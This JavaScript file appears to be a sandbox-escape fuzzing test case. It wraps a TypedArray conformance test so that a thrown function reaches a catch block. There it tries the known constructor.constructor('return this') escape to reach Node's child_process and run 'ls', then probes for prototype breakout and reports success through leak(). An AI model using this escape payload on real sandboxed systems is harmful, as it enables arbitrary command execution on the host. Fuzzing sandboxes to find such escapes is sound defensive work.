try {
    var obj = {
        '0': null,
        '2': 42,
        '3': '7',
        '4': NaN,
        '5': Symbol('1'),
        length: 5
    };
    testWithTypedArrayConstructors(function (TA) {
        throw () => {
            return () => {
            };
        };
        var typedArray = new TA(obj);
        assert.sameValue(typedArray.length, 5);
        assert.sameValue(typedArray[0], 0);
        assert.sameValue(typedArray[2], 42);
        assert.sameValue(typedArray[3], 7);
        assert.sameValue(typedArray[5], undefined);
        assert.sameValue(typedArray.constructor, TA);
        assert.sameValue(Object.getPrototypeOf(typedArray), TA.prototype);
        if (TA === Float32Array || TA === Float64Array) {
            assert.sameValue(typedArray[1], NaN);
            assert.sameValue(typedArray[4], NaN);
        } else {
            assert.sameValue(typedArray[1], 0);
            assert.sameValue(typedArray[4], 0);
        }
    });
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}